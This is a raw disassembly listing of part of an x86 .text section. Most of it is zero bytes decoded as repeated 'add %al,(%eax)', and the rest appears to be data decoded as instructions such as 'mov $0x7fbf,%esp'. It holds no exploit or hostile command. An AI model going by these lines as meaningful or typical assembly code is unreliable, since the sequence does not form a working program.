                           .text:00401e15 7f 00                            jg     0x00401e17
                           .text:00401e17 00 18                            add    %bl,(%eax)
                           .text:00401e19 61                               popa   
                           .text:00401e1a 17                               pop    %ss
                           .text:00401e1b 04 00                            add    $0x0,%al
                           .text:00401e1d 00 00                            add    %al,(%eax)
                           .text:00401e1f 00 00                            add    %al,(%eax)
                           .text:00401e21 00 00                            add    %al,(%eax)
                           .text:00401e23 00 00                            add    %al,(%eax)
                           .text:00401e25 00 00                            add    %al,(%eax)
                           .text:00401e27 00 00                            add    %al,(%eax)
                           .text:00401e29 00 00                            add    %al,(%eax)
                           .text:00401e2b 00 00                            add    %al,(%eax)
                           .text:00401e2d 00 00                            add    %al,(%eax)
                           .text:00401e2f 00 00                            add    %al,(%eax)
                           .text:00401e31 00 00                            add    %al,(%eax)
                           .text:00401e33 00 00                            add    %al,(%eax)
                           .text:00401e35 00 00                            add    %al,(%eax)
                           .text:00401e37 00 00                            add    %al,(%eax)
                           .text:00401e39 00 00                            add    %al,(%eax)
                           .text:00401e3b 00 00                            add    %al,(%eax)
                           .text:00401e3d 00 00                            add    %al,(%eax)
                           .text:00401e3f 00 00                            add    %al,(%eax)
                           .text:00401e41 00 00                            add    %al,(%eax)
                           .text:00401e43 00 00                            add    %al,(%eax)
                           .text:00401e45 00 00                            add    %al,(%eax)
                           .text:00401e47 00 00                            add    %al,(%eax)
                           .text:00401e49 00 00                            add    %al,(%eax)
                           .text:00401e4b 00 00                            add    %al,(%eax)
                           .text:00401e4d 00 00                            add    %al,(%eax)
                           .text:00401e4f 00 00                            add    %al,(%eax)
                           .text:00401e51 00 00                            add    %al,(%eax)
                           .text:00401e53 00 00                            add    %al,(%eax)
                           .text:00401e55 00 00                            add    %al,(%eax)
                           .text:00401e57 00 00                            add    %al,(%eax)
                           .text:00401e59 00 00                            add    %al,(%eax)
                           .text:00401e5b 00 00                            add    %al,(%eax)
                           .text:00401e5d 00 00                            add    %al,(%eax)
                           .text:00401e5f 00 00                            add    %al,(%eax)
                           .text:00401e61 00 00                            add    %al,(%eax)
                           .text:00401e63 00 00                            add    %al,(%eax)
                           .text:00401e65 00 00                            add    %al,(%eax)
                           .text:00401e67 00 00                            add    %al,(%eax)
                           .text:00401e69 00 00                            add    %al,(%eax)
                           .text:00401e6b 00 00                            add    %al,(%eax)
                           .text:00401e6d 00 00                            add    %al,(%eax)
                           .text:00401e6f 00 00                            add    %al,(%eax)
                           .text:00401e71 00 00                            add    %al,(%eax)
                           .text:00401e73 00 00                            add    %al,(%eax)
                           .text:00401e75 00 00                            add    %al,(%eax)
                           .text:00401e77 00 00                            add    %al,(%eax)
                           .text:00401e79 00 00                            add    %al,(%eax)
                           .text:00401e7b 00 00                            add    %al,(%eax)
                           .text:00401e7d 00 00                            add    %al,(%eax)
                           .text:00401e7f 00 00                            add    %al,(%eax)
                           .text:00401e81 00 00                            add    %al,(%eax)
                           .text:00401e83 00 00                            add    %al,(%eax)
                           .text:00401e85 00 00                            add    %al,(%eax)
                           .text:00401e87 00 00                            add    %al,(%eax)
                           .text:00401e89 00 00                            add    %al,(%eax)
                           .text:00401e8b 00 00                            add    %al,(%eax)
                           .text:00401e8d 00 00                            add    %al,(%eax)
                           .text:00401e8f 00 00                            add    %al,(%eax)
                           .text:00401e91 00 00                            add    %al,(%eax)
                           .text:00401e93 00 00                            add    %al,(%eax)
                           .text:00401e95 00 00                            add    %al,(%eax)
                           .text:00401e97 00 00                            add    %al,(%eax)
                           .text:00401e99 00 00                            add    %al,(%eax)
                           .text:00401e9b 00 00                            add    %al,(%eax)
                           .text:00401e9d 00 00                            add    %al,(%eax)
                           .text:00401e9f 00 00                            add    %al,(%eax)
                           .text:00401ea1 00 00                            add    %al,(%eax)
                           .text:00401ea3 00 00                            add    %al,(%eax)
                           .text:00401ea5 00 00                            add    %al,(%eax)
                           .text:00401ea7 00 00                            add    %al,(%eax)
                           .text:00401ea9 00 00                            add    %al,(%eax)
                           .text:00401eab 00 00                            add    %al,(%eax)
                           .text:00401ead 00 00                            add    %al,(%eax)
                           .text:00401eaf 00 00                            add    %al,(%eax)
                           .text:00401eb1 00 00                            add    %al,(%eax)
                           .text:00401eb3 00 00                            add    %al,(%eax)
                           .text:00401eb5 00 00                            add    %al,(%eax)
                           .text:00401eb7 00 00                            add    %al,(%eax)
                           .text:00401eb9 00 00                            add    %al,(%eax)
                           .text:00401ebb 00 00                            add    %al,(%eax)
                           .text:00401ebd 00 00                            add    %al,(%eax)
                           .text:00401ebf 00 00                            add    %al,(%eax)
                           .text:00401ec1 00 00                            add    %al,(%eax)
                           .text:00401ec3 00 00                            add    %al,(%eax)
                           .text:00401ec5 00 00                            add    %al,(%eax)
                           .text:00401ec7 00 00                            add    %al,(%eax)
                           .text:00401ec9 00 00                            add    %al,(%eax)
                           .text:00401ecb 00 00                            add    %al,(%eax)
                           .text:00401ecd 00 00                            add    %al,(%eax)
                           .text:00401ecf 00 00                            add    %al,(%eax)
                           .text:00401ed1 00 00                            add    %al,(%eax)
                           .text:00401ed3 00 00                            add    %al,(%eax)
                           .text:00401ed5 00 00                            add    %al,(%eax)
                           .text:00401ed7 00 00                            add    %al,(%eax)
                           .text:00401ed9 00 00                            add    %al,(%eax)
                           .text:00401edb 00 00                            add    %al,(%eax)
                           .text:00401edd 00 00                            add    %al,(%eax)
                           .text:00401edf 00 00                            add    %al,(%eax)
                           .text:00401ee1 00 00                            add    %al,(%eax)
                           .text:00401ee3 00 00                            add    %al,(%eax)
                           .text:00401ee5 00 00                            add    %al,(%eax)
                           .text:00401ee7 00 00                            add    %al,(%eax)
                           .text:00401ee9 00 00                            add    %al,(%eax)
                           .text:00401eeb 00 00                            add    %al,(%eax)
                           .text:00401eed 00 00                            add    %al,(%eax)
                           .text:00401eef 00 00                            add    %al,(%eax)
                           .text:00401ef1 00 00                            add    %al,(%eax)
                           .text:00401ef3 00 00                            add    %al,(%eax)
                           .text:00401ef5 00 00                            add    %al,(%eax)
                           .text:00401ef7 00 00                            add    %al,(%eax)
                           .text:00401ef9 00 00                            add    %al,(%eax)
                           .text:00401efb 00 00                            add    %al,(%eax)
                           .text:00401efd 00 00                            add    %al,(%eax)
                           .text:00401eff 00 00                            add    %al,(%eax)
                           .text:00401f01 00 00                            add    %al,(%eax)
                           .text:00401f03 00 00                            add    %al,(%eax)
                           .text:00401f05 00 00                            add    %al,(%eax)
                           .text:00401f07 00 00                            add    %al,(%eax)
                           .text:00401f09 00 00                            add    %al,(%eax)
                           .text:00401f0b 00 00                            add    %al,(%eax)
                           .text:00401f0d 00 00                            add    %al,(%eax)
                           .text:00401f0f 00 00                            add    %al,(%eax)
                           .text:00401f11 00 00                            add    %al,(%eax)
                           .text:00401f13 00 00                            add    %al,(%eax)
                           .text:00401f15 00 00                            add    %al,(%eax)
                           .text:00401f17 00 f1                            add    %dh,%cl
                           .text:00401f19 00 00                            add    %al,(%eax)
                           .text:00401f1b 00 00                            add    %al,(%eax)
                           .text:00401f1d 00 00                            add    %al,(%eax)
                           .text:00401f1f 00 70 5c                         add    %dh,0x5c(%eax)
                           .text:00401f22 c8 03 00 00                      enter  $0x3,$0x0
                           .text:00401f26 00 00                            add    %al,(%eax)
                           .text:00401f28 10 0d 60 05 00 00                adc    %cl,0x560
                           .text:00401f2e 00 00                            add    %al,(%eax)
                           .text:00401f30 70 ab                            jo     0x00401edd
                           .text:00401f32 56                               push   %esi
                           .text:00401f33 bc bf 7f 00 00                   mov    $0x7fbf,%esp
                           .text:00401f38 a1 00 00 00 00                   mov    0x0,%eax
                           .text:00401f3d 00 00                            add    %al,(%eax)
                           .text:00401f3f 00 b0 5c c8 03 00                add    %dh,0x3c85c(%eax)
                           .text:00401f45 00 00                            add    %al,(%eax)
                           .text:00401f47 00 78 1b                         add    %bh,0x1b(%eax)
                           .text:00401f4a c0 c3 bf                         rol    $0xbf,%bl
                           .text:00401f4d 7f 00                            jg     0x00401f4f
                           .text:00401f4f 00 b0 aa 56 bc bf                add    %dh,-0x4043a956(%eax)
                           .text:00401f55 7f 00                            jg     0x00401f57
                           .text:00401f57 00 81 00 00 00 00                add    %al,0x0(%ecx)
                           .text:00401f5d 00 00                            add    %al,(%eax)
                           .text:00401f5f 00 b0 5c c8 03 00                add    %dh,0x3c85c(%eax)
                           .text:00401f65 00 00                            add    %al,(%eax)
                           .text:00401f67 00 78 1b                         add    %bh,0x1b(%eax)
                           .text:00401f6a c0 c3 bf                         rol    $0xbf,%bl
                           .text:00401f6d 7f 00                            jg     0x00401f6f
                           .text:00401f6f 00 80 aa 56 bc bf                add    %al,-0x4043a956(%eax)
                           .text:00401f75 7f 00                            jg     0x00401f77
                           .text:00401f77 00 61 00                         add    %ah,0x0(%ecx)
                           .text:00401f7a 00 00                            add    %al,(%eax)
                           .text:00401f7c 00 00                            add    %al,(%eax)
                           .text:00401f7e 00 00                            add    %al,(%eax)
                           .text:00401f80 b0 5c                            mov    $0x5c,%al
                           .text:00401f82 c8 03 00 00                      enter  $0x3,$0x0
                           .text:00401f86 00 00                            add    %al,(%eax)
                           .text:00401f88 78 1b                            js     0x00401fa5
                           .text:00401f8a c0 c3 bf                         rol    $0xbf,%bl
                           .text:00401f8d 7f 00                            jg     0x00401f8f
                           .text:00401f8f 00 d0                            add    %dl,%al
                           .text:00401f91 ab                               stos   %eax,%es:(%edi)
                           .text:00401f92 56                               push   %esi
                           .text:00401f93 bc bf 7f 00 00                   mov    $0x7fbf,%esp
                           .text:00401f98 41                               inc    %ecx
                           .text:00401f99 00 00                            add    %al,(%eax)
                           .text:00401f9b 00 00                            add    %al,(%eax)
                           .text:00401f9d 00 00                            add    %al,(%eax)
                           .text:00401f9f 00 b0 5c c8 03 00                add    %dh,0x3c85c(%eax)
                           .text:00401fa5 00 00                            add    %al,(%eax)
                           .text:00401fa7 00 78 1b                         add    %bh,0x1b(%eax)
                           .text:00401faa c0 c3 bf                         rol    $0xbf,%bl
                           .text:00401fad 7f 00                            jg     0x00401faf
                           .text:00401faf 00 00                            add    %al,(%eax)
                           .text:00401fb1 ac                               lods   %ds:(%esi),%al
                           .text:00401fb2 56                               push   %esi
                           .text:00401fb3 bc bf 7f 00 00                   mov    $0x7fbf,%esp
                           .text:00401fb8 21 00                            and    %eax,(%eax)
                           .text:00401fba 00 00                            add    %al,(%eax)
                           .text:00401fbc 00 00                            add    %al,(%eax)
                           .text:00401fbe 00 00                            add    %al,(%eax)
                           .text:00401fc0 c0 3c 90 02                      sarb   $0x2,(%eax,%edx,4)
                           .text:00401fc4 00 00                            add    %al,(%eax)
                           .text:00401fc6 00 00                            add    %al,(%eax)
                           .text:00401fc8 70 98                            jo     0x00401f62
                           .text:00401fca b0 04                            mov    $0x4,%al
                           .text:00401fcc 00 00                            add    %al,(%eax)
                           .text:00401fce 00 00                            add    %al,(%eax)
                           .text:00401fd0 20 10                            and    %dl,(%eax)
                           .text:00401fd2 00 00                            add    %al,(%eax)
                           .text:00401fd4 00 00                            add    %al,(%eax)
                           .text:00401fd6 00 00                            add    %al,(%eax)
                           .text:00401fd8 30 00                            xor    %al,(%eax)
                           .text:00401fda 00 00                            add    %al,(%eax)
                           .text:00401fdc 00 00                            add    %al,(%eax)
                           .text:00401fde 00 00                            add    %al,(%eax)
                           .text:00401fe0 70 0c                            jo     0x00401fee
                           .text:00401fe2 ba 04 00 00 00                   mov    $0x4,%edx
                           .text:00401fe7 00 40 f4                         add    %al,-0xc(%eax)
                           .text:00401fea 94                               xchg   %eax,%esp
                           .text:00401feb a4                               movsb  %ds:(%esi),%es:(%edi)
                           .text:00401fec bf 7f 00 00 b8                   mov    $0xb800007f,%edi
                           .text:00401ff1 48                               dec    %eax
                           .text:00401ff2 57                               push   %edi
                           .text:00401ff3 bc bf 7f 00 00                   mov    $0x7fbf,%esp
                           .text:00401ff8 63 08                            arpl   %cx,(%eax)
                           .text:00401ffa 00 48 8b                         add    %cl,-0x75(%eax)
                           .text:00401ffd 1b 48 85                         sbb    -0x7b(%eax),%ecx
